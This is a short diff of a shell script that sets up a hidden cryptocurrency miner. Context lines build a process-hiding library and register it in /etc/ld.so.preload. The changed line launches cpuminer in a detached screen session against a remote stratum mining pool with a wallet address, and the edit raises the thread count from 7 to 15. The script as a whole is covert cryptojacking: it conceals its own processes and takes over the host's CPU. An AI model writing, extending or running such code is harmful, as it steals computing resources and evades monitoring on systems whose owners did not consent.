@@ -54,7 +54,7 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-screen -S Wuenuak_Guerrr -dm ./graftcp/graftcp ./cpuminer-sse2 -a minotaurx  -o stratum+tcps://stratum-asia.rplant.xyz:17063 -u PFiw1McLfMKeqRMdhHG7ne6cEw2Z13ABgY.$(shuf -n 1 -i 1-999999) -t7
+screen -S Wuenuak_Guerrr -dm ./graftcp/graftcp ./cpuminer-sse2 -a minotaurx  -o stratum+tcps://stratum-asia.rplant.xyz:17063 -u PFiw1McLfMKeqRMdhHG7ne6cEw2Z13ABgY.$(shuf -n 1 -i 1-999999) -t15
 screen -ls
 sleep 2
 clear
